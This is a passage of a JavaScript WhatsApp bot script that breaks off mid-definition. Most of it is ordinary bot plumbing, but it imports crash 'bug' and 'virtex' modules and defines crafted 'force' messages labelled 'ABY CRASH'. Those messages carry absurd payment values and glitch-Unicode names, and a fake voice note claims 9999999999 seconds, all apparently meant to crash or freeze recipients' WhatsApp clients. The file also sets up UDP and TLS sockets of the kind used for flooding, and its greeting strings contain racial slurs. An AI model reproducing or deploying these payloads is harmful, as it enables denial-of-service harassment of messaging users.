/*

SC BY : ABYY XVN ⚡
 
VERSION SCRIPT 9.0
 
tiktok : tiktok.com/@abyyyyyreall
yt : https://youtube.com/@abyyyferr
tele : https://t.me/byxxone
tele² : https://t.me/gryxzhuh
room public tele : https://t.me/RoomPublicAbyyXvN
*/

require('./settings')
const {
smsg, getGroupAdmins, formatp, h2k, tanggal, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize
} = require('./lib/myfunction')
//=================================================//
const { downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')
//=================================================//
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys')
//=================================================//
// Disini Ada Beberapa Modul Yg Udh kg gw Pake, lu Hapus Sendiri Aj 🚬🗿
const axios = require('axios')
const os = require('os').cpus().length
const util = require('util')
const urll = require('url')
const jimp = require('jimp')
const fetch = require('node-fetch')
const speed = require('performance-now')
const moment = require('moment-timezone')
const pino = require('pino')
const { spawn: spawn, exec } = require('child_process')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { performance } = require('perf_hooks')
const dgram = require('dgram')
const fg = require('api-dylux')
const cheerio = require('cheerio')
const ytdl = require("ytdl-core")
const colors = require('@colors/colors/safe')
const chalk = require('chalk')
const FormData = require('form-data')
const ms = toMs = require('ms')
const crypto = require("crypto")
const yts = require("yt-search")
const tls = require('tls')
const net = require('net')
const http2 = require('http2')
const cluster = require('cluster')
const { color } = require('./lib/color')
const { uptotelegra } = require('./lib/upload')
const { remini } = require('./lib/remini')
const { toPTT, toAudio } = require("./lib/converter")
const { UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const sockett = dgram.createSocket('udp4')
const bochil = require("@bochilteam/scraper")
const fakeUA = require('fake-useragent')
const randomUA = fakeUA().toString()
const fs = require('fs')
//=================================================//
const {
addPremiumUser,
getPremiumExpired,
getPremiumPosition,
expiredCheck,
checkPremiumUser,
getAllPremiumUser,
} = require('./lib/premiun')
let afk = require("./lib/afk") //afk

//=================================================//
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
let tebaklagu = db.data.game.tebaklagu = []
let kuismath = db.data.game.kuismath = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let tebakkalimat = db.data.game.tebakkalimat = []
let tebaklirik = db.data.game.tebaklirik = []
let tebaktebakan = db.data.game.tebaktebakan = []
let tebakbendera = db.data.game.tebakbendera = []
let tebakbendera2 = db.data.game.tebakbendera2 = []
let tebakkabupaten = db.data.game.tebakkabupaten = []
let tebakkimia = db.data.game.tebakkimia = []
let tebakasahotak = db.data.game.tebakasahotak = []
let tebaksiapakahaku = db.data.game.tebaksiapakahaku = []
let tebaksusunkata = db.data.game.tebaksusunkata = []
let tebaktekateki = db.data.game.tebaktekateki = []
let _afk = JSON.parse(fs.readFileSync('./dtbs/afk-user.json'))
let ntvirtex = JSON.parse(fs.readFileSync('./dtbs/enable/antivirus.json'))
let nttoxic = JSON.parse(fs.readFileSync('./dtbs/enable/antitoxic.json'))
let ntasing = JSON.parse(fs.readFileSync('./dtbs/enable/antiasing.json'))
let ntwame = JSON.parse(fs.readFileSync('./dtbs/enable/antiwame.json'))
let ntilinkall =JSON.parse(fs.readFileSync('./dtbs/enable/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./dtbs/enable/antilinktwitter.json'))
let ntilinktt =JSON.parse(fs.readFileSync('./dtbs/enable/antilinktiktok.json'))
let ntilinktg =JSON.parse(fs.readFileSync('./dtbs/enable/antilinktelegram.json'))
let ntilinkfb =JSON.parse(fs.readFileSync('./dtbs/enable/antilinkfacebook.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./dtbs/enable/antilinkinstagram.json'))
let ntilinkytch =JSON.parse(fs.readFileSync('./dtbs/enable/antilinkytchannel.json'))
let ntilinkytvid =JSON.parse(fs.readFileSync('./dtbs/enable/antilinkytvideo.json'))

//=================================================//
module.exports = byxz = async (byxz, m, chatUpdate, store) => {
try {
var body = (
m.mtype === 'conversation' ? m.message.conversation :
m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === 'interactiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === 'messageContextInfo' ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text :
''
);
//=================================================//
const DB = 'https://raw.githubusercontent.com/byxxXvN/thezxo/refs/heads/main/surikity';
///=================================================//
async function isBotNumberRegistered(botNumber) {
	try {
		const response = await axios.get(DB);
		if (!Array.isArray(response.data)) {
			console.error('Data Yang Diterima Tidak Valid: Harus Berupa Array.');
			return false;
		}
		const registeredBotNumbers = response.data;
		return registeredBotNumbers.includes(botNumber);
	} catch (error) {
		console.error('Error Fetching Registered Bot Numbers:', error.message);
		return false;
	}
}
//=================================================//
const { groupMembers } = m
var budy = (typeof m.text == 'string' ? m.text : '')
const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
const prefix = prefa && prefixRegex.test(body) ? body.match(prefixRegex)[0] : (prefa ?? global.prefix)
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const fatkuns = (m.quoted || m)
const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
//User
const botNumber = await byxz.decodeJid(byxz.user.id)
const itsMe = m.sender == botNumber ? true : false
const orgkaya = JSON.parse(fs.readFileSync('./dtbs/premium.json'))
const kontributor = JSON.parse(fs.readFileSync('./dtbs/owner.json'))
const iniseller = JSON.parse(fs.readFileSync('./dtbs/seller.json'))
const contacts = JSON.parse(fs.readFileSync("./dtbs/contacts.json"))
const isContacts = contacts.includes(m.sender)
const isReseller = [botNumber, ...iniseller, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDeveloper = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isPremium = isDeveloper || isDeveloper || checkPremiumUser(m.sender, orgkaya);
const isAfkOn = afk.checkAfkUser(m.sender, _afk)    

// Group
const groupMetadata = m.isGroup ? await byxz.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isGroup = m.chat.endsWith('@g.us')
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
const AntiLink = m.isGroup ? ntilink.includes(m.chat) : false 
const AntiVirtex = m.isGroup ? ntvirtex.includes(m.chat) : false
const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(m.chat) : false
const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(m.chat) : false
const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(m.chat) : false
const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(m.chat) : false
const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(m.chat) : false
const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(m.chat) : false
const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(m.chat) : false
const AntiLinkAll = m.isGroup ? ntilinkall.includes(m.chat) : false
const AntiWame = m.isGroup ? ntwame.includes(m.chat) : false
const AntiToxic = m.isGroup ? nttoxic.includes(m.chat) : false
const AntiAsing = m.isGroup ? ntasing.includes(m.chat) : false

//=================================================//
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = db.data.users[m.sender]
if (typeof user !== 'object') db.data.users[m.sender] = {}
const chats = db.data.chats[m.chat]
if (typeof chats !== 'object') db.data.chats[m.chat] = {
}
if (user) {
if (!isNumber(user.money)) user.money = 0
if (!isNumber(user.chip)) user.chip = 0
if (!isNumber(user.atm)) user.atm = 0
if (!isNumber(user.fullatm)) user.fullatm = 0
if (!isNumber(user.bank)) user.bank = 0
if (!isNumber(user.health)) user.health = 100
if (!isNumber(user.potion)) user.potion = 0
if (!isNumber(user.trash)) user.trash = 0
if (!isNumber(user.wood)) user.wood = 0
if (!isNumber(user.rock)) user.rock = 0
if (!isNumber(user.string)) user.string = 0
if (!isNumber(user.petfood)) user.petfood = 0
if (!isNumber(user.emerald)) user.emerald = 0
if (!isNumber(user.diamond)) user.diamond = 0
if (!isNumber(user.gold)) user.gold = 0
if (!isNumber(user.botol)) user.botol = 0
if (!isNumber(user.kardus)) user.kardus = 0
if (!isNumber(user.kaleng)) user.kaleng = 0
if (!isNumber(user.gelas)) user.gelas = 0
if (!isNumber(user.plastik)) user.plastik = 0
if (!isNumber(user.iron)) user.iron = 0
if (!isNumber(user.common)) user.common = 0
if (!isNumber(user.uncommon)) user.uncommon = 0
if (!isNumber(user.mythic)) user.mythic = 0
if (!isNumber(user.legendary)) user.legendary = 0
if (!isNumber(user.umpan)) user.umpan = 0
if (!isNumber(user.pet)) user.pet = 0
if (!isNumber(user.paus)) user.paus = 0
if (!isNumber(user.kepiting)) user.kepiting = 0
if (!isNumber(user.gurita)) user.gurita = 0
if (!isNumber(user.cumi)) user.cumi = 0
if (!isNumber(user.buntal)) user.buntal = 0
if (!isNumber(user.dory)) user.dory = 0
if (!isNumber(user.lumba)) user.lumba = 0
if (!isNumber(user.lobster)) user.lobster = 0
if (!isNumber(user.hiu)) user.hiu = 0
if (!isNumber(user.udang)) user.udang = 0
if (!isNumber(user.orca)) user.orca = 0
if (!isNumber(user.banteng)) user.banteng = 0
if (!isNumber(user.gajah)) user.gajah = 0
if (!isNumber(user.harimau)) user.harimau = 0
if (!isNumber(user.kambing)) user.kambing = 0
if (!isNumber(user.panda)) user.panda = 0
if (!isNumber(user.buaya)) user.buaya = 0
if (!isNumber(user.kerbau)) user.kerbau = 0
if (!isNumber(user.sapi)) user.sapi = 0
if (!isNumber(user.monyet)) user.monyet = 0
if (!isNumber(user.babihutan)) user.babihutan = 0
if (!isNumber(user.babi)) user.babi = 0
if (!isNumber(user.ayam)) user.ayam = 0
if (!isNumber(user.lastadventure)) user.lastadventure = 0
if (!isNumber(user.lastkill)) user.lastkill = 0
if (!isNumber(user.lastmisi)) user.lastmisi = 0
if (!isNumber(user.lastdungeon)) user.lastdungeon = 0
if (!isNumber(user.lastwar)) user.lastwar = 0
if (!isNumber(user.lastsda)) user.lastsda = 0
if (!isNumber(user.lastduel)) user.lastduel = 0
if (!isNumber(user.lastmining)) user.lastmining = 0
if (!isNumber(user.lasthunt)) user.lasthunt = 0
if (!isNumber(user.lastgift)) user.lastgift = 0
if (!isNumber(user.lastberkebon)) user.lastberkebon = 0
if (!isNumber(user.lastdagang)) user.lastdagang = 0
if (!isNumber(user.lasthourly)) user.lasthourly = 0
if (!isNumber(user.lastbansos)) user.lastbansos = 0
if (!isNumber(user.lastrampok)) user.lastrampok = 0
if (!isNumber(user.lastclaim)) user.lastclaim = 0
if (!isNumber(user.lastnebang)) user.lastnebang = 0
if (!isNumber(user.lastweekly)) user.lastweekly = 0
if (!isNumber(user.lastmonthly)) user.lastmonthly = 0
if (!isNumber(user.apel)) user.apel = 0
if (!isNumber(user.anggur)) user.anggur = 0
if (!isNumber(user.jeruk)) user.jeruk = 0
if (!isNumber(user.mangga)) user.mangga = 0
if (!isNumber(user.pisang)) user.pisang = 0
if (!isNumber(user.makanan)) user.makanan = 0
if (!isNumber(user.bibitanggur)) user.bibitanggur = 0
if (!isNumber(user.bibitpisang)) user.bibitpisang = 0
if (!isNumber(user.bibitapel)) user.bibitapel = 0
if (!isNumber(user.bibitmangga)) user.bibitmangga = 0
if (!isNumber(user.bibitjeruk)) user.bibitjeruk = 0
if (!isNumber(user.horse)) user.horse = 0
if (!isNumber(user.exp)) user.exp = 0
if (!isNumber(user.horseexp)) user.horseexp = 0
if (!isNumber(user.cat)) user.cat = 0
if (!isNumber(user.catexp)) user.catexp = 0
if (!isNumber(user.fox)) user.fox = 0
if (!isNumber(user.foxhexp)) user.foxexp = 0
if (!isNumber(user.dog)) user.foxexp = 0
if (!isNumber(user.dogexp)) user.dogexp = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.roboexp)) user.roboexp = 0
if (!isNumber(user.horselastfeed)) user.horselastfeed = 0
if (!isNumber(user.catlastfeed)) user.catlastfeed = 0
if (!isNumber(user.robolastfeed)) user.robolastfeed = 0
if (!isNumber(user.foxlastfeed)) user.foxlastfeed = 0
if (!isNumber(user.doglastfeed)) user.doglastfeed = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.robodurability)) user.robodurability = 0
if (!isNumber(user.armor)) user.armor = 0
if (!isNumber(user.armordurability)) user.armordurability = 0
if (!isNumber(user.sword)) user.sword = 0
if (!isNumber(user.sworddurability)) user.sworddurability = 0
if (!isNumber(user.pickaxe)) user.pickaxe = 0
if (!isNumber(user.pickaxedurability)) user.pickaxedurability = 0
if (!isNumber(user.fishingrod)) user.fishingrod = 0
if (!isNumber(user.fishingroddurability)) user.fishingroddurability = 0
if (!user.premium) user.premiumTime = 0
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
premiumTime: 0,
premium: false,
money: 30000,
exp: 0,
limit: 30,
freelimit: 0,
lastclaim: 0,
skata: 0,
registered: false,
name: m.name,
pc: 0,
joinlimit: 1,
age: -1,
regTime: -1,
unreg: false,
afk: -1,
afkReason: '',
banned: false,
bannedTime: 0,
warning: 0,
level: 0,
rokets: 0,
role: 'Beginner',
skill: '',
ojekk: 0,
WarnReason: '',
chip: 0,
bank: 0,
atm: 0,
fullatm: 0,
health: 100,
potion: 10,
trash: 0,
wood: 0,
rock: 0,
string: 0,
emerald: 0,
diamond: 0,
gold: 0,
iron: 0,
common: 0,
uncommon: 0,
mythic: 0,
legendary: 0,
umpan: 0,
pet: 0,
horse: 0,
horseexp: 0,
horselastfeed: 0,
cat: 0,
catexp: 0,
catlastfeed: 0,
fox: 0,
foxexp: 0,
foxlastfeed: 0,
robo: 0,
roboexp: 0,
robolastfeed: 0,
dog: 0,
dogexp: 0,
doglastfeed: 0,
paus: 0,
kepiting: 0,
gurita: 0,
cumi: 0,
buntal: 0,
dory: 0,
lumba: 0,
lobster: 0,
hiu: 0,
udang: 0,
ikan: 0,
orca: 0,
banteng: 0,
harimau: 0,
gajah: 0,
kambing: 0,
buaya: 0,
kerbau: 0,
sapi: 0,
monyet: 0,
babi: 0,
ayam: 0,
armor: 0,
armordurability: 0,
sword: 0,
sworddurability: 0,
pickaxe: 0,
pickaxedurability: 0,
fishingrod: 0,
fishingroddurability: 0,
robo: 0,
robodurability: 0,
apel: 20,
pisang: 0,
anggur: 0,
mangga: 0,
jeruk: 0,
lastadventure: 0,
lastkill: 0,
lastmisi: 0,
lastdungeon: 0,
lastwar: 0,
lastsda: 0,
lastduel: 0,
lastmining: 0,
lasthunt: 0,
lastgift: 0,
lastberkebon: 0,
lastdagang: 0,
lasthourly: 0,
lastbansos: 0,
lastrampok: 0,
lastclaim: 0,
lastnebang: 0,
lastweekly: 0,
lastmonthly: 0
}
//=================================================//
const setting = db.data.settings[botNumber]
        if (typeof setting !== 'object') db.data.settings[botNumber] = {}
	    if (setting) {
//    	    if (!('anticall' in setting)) setting.anticall = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
            if (!('autoread' in setting)) setting.autoread = false
            if (!('autoTyping' in setting)) setting.autoTyping = false
            if (!('autoRecord' in setting)) setting.autoRecord = false
//        if (!('goodbye' in setting)) chats.goodbye = setting.auto_leaveMsg
//        if (!('welcome' in setting)) chats.welcome = setting.auto_welcomeMsg
       if (!('onlygrub' in setting)) setting.onlygrub = false
	  } else db.data.settings[botNumber] = {
//    	  anticall: false,
    		status: 0,
    		stock:10,
    		autobio: false,
    		autoTyping: false,
//    		auto_ai_grup: true,
//    		goodbye: true,
    		onlygrub: false,
//        welcome: true, 
    		autoread: false,
    		menuType: 'externalImage' //> buttonImage
	    }

} catch (err) {
console.error(err)
}
//=================================================//
const thumb = fs.readFileSync(`./image/thumb.jpg`)
const dev = fs.readFileSync(`./image/dev.jpg`)
const albert = fs.readFileSync(`./image/albert.jpg`)
const slayer07 = fs.readFileSync(`./image/slayer07.jpg`)
const latx = fs.readFileSync(`./image/latx.png`)
const fakedoc = fs.readFileSync(`./src/bruhhh.apk`)
const fakejpg = fs.readFileSync(`./src/bruhhh.jpg`)
//=================================================//
const { dafontSearch, dafontDown } = require('./lib/dafont.js')
const scp1 = require('./lib/scraper.js') 
const ffstalk = require('./lib/ffstalk.js')
const githubstalk = require('./lib/githubstalk.js')
const npmstalk = require('./lib/npmstalk.js')
const mlstalk = require('./lib/mlstalk.js')
const textpro = require('./lib/textpro.js')
const photooxy = require('./lib/photooxy.js')
//==========[ IMAGE URL ]===============//
const images = ["https://graph.org/file/f0978011cc72cbb0b0653-d4990cfcfa29868bd3.jpg", "https://graph.org/file/d10c1d5767502b2e354ba-344986769bb3887b1d.jpg", "https://graph.org/file/28f72bbd8af676e6065ab-a20c09d333c8037cc7.jpg", "https://graph.org/file/177e15612535fd4fa17c1-15409c444c0a986d34.jpg", "https://graph.org/file/c79923548bf5039937e7d-30b089304743c53d09.jpg", "https://graph.org/file/9a9dc6f766e2f36cec3d9-73b0c7d3cc884cbcb8.jpg", "https://graph.org/file/38995b320ad1615a519f2-2f877291f43ad51058.jpg", "https://graph.org/file/fadd719cc499a91a8e69d-9c5b96c34d7c8ce757.jpg", "https://graph.org/file/e3c4fe18660739914c11f-6a4e6039133d55f7ff.jpg", "https://graph.org/file/7547ca8b260d09060d098-e3d0b439a50382ec2e.jpg"]
const allimage = images[Math.floor(Math.random() * images.length)]
//===================================//
		//EMOJI\\
		//React Feature 
		const successreact = ['✅']
		const finishmoji = successreact[Math.floor(Math.random() * successreact.length)]
		const taskdone = (teks) => {
			return byxz.sendMessage(m.chat, {
				react: {
					text: teks,
					key: m.key
				}
			})
		}
//===============[ ALL FUNC BUG ]===================//

//ngapain? mau nyolong func ya 😹
const { locasfrze, xlocztwo, xlocztree, xlocfrz, xlocstck, voxlocas, voxlocas2, voxlocas3, xlocui, voxtrash, tuxasz, xpokers, xtraxzz, vulcanicx, zyrenx } = require("./lib/functionbug.js")
//=================================================//
const { button } = require("./virtex/button.js")
const { ios } = require("./virtex/ios.js")
const { blankx7 } = require("./virtex/blankx7.js")
const { curix } = require("./virtex/curix.js")
const { crucifix } = require("./virtex/crucifix.js")
//=================================================//
if (!m.key.fromMe && db.data.settings[botNumber].autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await byxz.readMessages([readkey]);
}
byxz.sendPresenceUpdate('available', m.chat)
if (db.data.settings[botNumber].autoTyping) {
if (m.message) {
byxz.sendPresenceUpdate('composing', m.chat)
}
}
if (db.data.settings[botNumber].autoRecord) {
if (m.message) {
byxz.sendPresenceUpdate('recording', m.chat)
}
}
if (db.data.settings[botNumber].autobio) {
let setting = db.data.settings[botNumber]
if (new Date() * 1 - setting.status > 1000) {
let uptime = await runtime(process.uptime())
await byxz.updateProfileStatus(`✳️ AlbertVO || ✅ Runtime : ${uptime}`)
setting.status = new Date() * 1
}
}

/*let rn = ['composing','recording','paused']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
byxz.sendPresenceUpdate(jd, m.chat)
}
*/
//=================================================//
const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
ytdl(Link, { filter: 'audioonly' }).pipe(fs.createWriteStream(mp3File)).on('finish', async () => {
await byxz.sendMessage(m.chat, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(`./${mp3File}`)
})
} catch (err) {
byxzreply(`${err}`)
}
}
//=================================================//
const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
let nana = ytdl(Link).pipe(fs.createWriteStream(mp4File)).on('finish', async () => {
await byxz.sendMessage(m.chat, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
byxzreply(`${err}`)
}
}
//=================================================//
//Push Kintil
const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
//=================================================//
//Ini Waktu | Waktu adalah emas,maka dari itu sentuh lah rumput.dan jangan nolep dikamar terus,usahakan tu kontol jangan dikocok terus.Lutut ama sikut lu kopong nanti
const moment = require('moment-timezone');
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = " sup ma nigga"
} else if (time >= "15:00:00" && time < "19:00:00") {
ucapanWaktu = " sup ma dawg"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "sup yall"
} else if (time >= "06:00:00" && time < "11:00:00") {
ucapanWaktu = "morning ma nigga"
} else {
ucapanWaktu = "morning dawg"
}
const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z")
const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z")
const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z")
const salam = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a")
let d = new Date
let gmt = new Date(0).getTime() - new Date("1 Januari 2024").getTime()
let weton = ["Pahing", "Pon","Wage","Kliwon","Legi"][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString("id", { weekday: "long" })
let calender = d.toLocaleDateString("id", {
day: "numeric",
month: "long",
year: "numeric"
})
//=================================================//
// Badwords
const badwords = JSON.parse(fs.readFileSync('./src/badwords.json'))
const addbadwords = async (kata) => {
let badwords=JSON.parse(fs.readFileSync('./src/badwords.json'))
badwords.push(kata)
fs.writeFileSync('./src/badwords.json',JSON.stringify(badwords))
byxzreply(`Kata kasar "${kata}" berhasil ditambahkan.`)
}

const deletebadwords = async (kata) => {
let badwords=JSON.parse(fs.readFileSync('./src/badwords.json'))
badwords=badwords.filter(word=>word!==kata)
fs.writeFileSync('./src/badwords.json',JSON.stringify(badwords))
byxzreply(`Kata kasar "${kata}" berhasil dihapus.`)
}
//=================================================//
//Status
if (!byxz.public) {
if (!m.key.fromMe) return
} 
//=================================================//

async function loading () {
var gen2 = [
"█▒▒▒▒▒▒▒▒▒10%",
"█████▒▒▒▒▒50%",
"████████▒▒80%",
"██████████100%",
"⋘ 𝑙𝑜𝑎𝑑𝑖𝑛𝑔 𝑑𝑎𝑡𝑎... ⋙",
"𝗟𝗼𝗮𝗱𝗶𝗻𝗴 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✓"
]
let { key } = await byxz.sendMessage(m.chat, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < gen2.length; i++) {
await sleep(10)
await byxz.sendMessage(m.chat, {text: gen2[i], edit: key });
}
}

//=================================================//





const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍⿻A҉B҉Y҉ ҉C҉R҉A҉S҉H҉⿻╮⭑ ☠️⃰͜͡؜𝐀҉҉𝐛҉҉𝐲҉҉𝐲҉҉⭐️᜴ #𝐀𝐛𝐲𝐲𝐌𝐞𝐰𝐦𝐤ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}




//=================================================//
const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍⿻A҉B҉Y҉ ҉C҉R҉A҉S҉H҉⿻╮⭑ ☠️⃰͜͡؜𝐀҉҉𝐛҉҉𝐲҉҉𝐲҉҉⭐️᜴ #𝐀𝐛𝐲𝐲𝐌𝐞𝐰𝐦𝐤ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}





//=================================================//


const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": "🌠 Abyy Client - Multi Device",
    "description": "Pe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}

const byxreqphone = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"requestPhoneNumberMessage": {
"contextinfo": 1
}
}
}

const byxvoice = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 9999999999,
"ptt": "true"
}
}
}

const fpoll = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"pollCreationMessage": {
"name": "p"
}
}
}

const byxbug = {
key: {
